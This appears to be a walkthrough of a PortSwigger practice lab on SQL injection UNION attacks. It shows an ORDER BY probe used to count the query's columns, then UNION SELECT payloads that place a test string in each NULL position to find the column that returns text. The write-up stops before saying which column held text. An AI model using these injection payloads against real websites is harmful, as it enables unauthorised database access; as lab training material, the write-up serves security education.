## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/94665b713a64ef2e438db55767ed97a91bdfd96d/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Lab%20Description.png)

## Solution :

Query made - 
```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

**ORDER BY 4** return an error, means there are 3 columns being queried and retreived by the web application.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/13d44334359f224f06c4a81297157e92302f3cd3/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/ORDER%20BY%204.png)


#### Determine the column containng text data -

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/bac817c2572779ad40b37b52f9460ec4e9d88934/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Retrieve%20String.png)


We need to use the UNION SELECT payload  using 3 NULL values. Try the string value *HgP47P* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.

**HgP47P in 1st NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'HgP47P',NULL,NULL --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/d4e8b72adaf8a3470480f438697f1cba9a9c2b7f/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%201st%20NULL.png)

**HgP47P in 2nd NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'HgP47P',NULL
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/84002f8217a3c24f74ca65aae11c3fb98c17496a/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%202nd%20NULL.png)

**HgP47P in 3rd NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,'HgP47P'
```

![image]()

![image]()


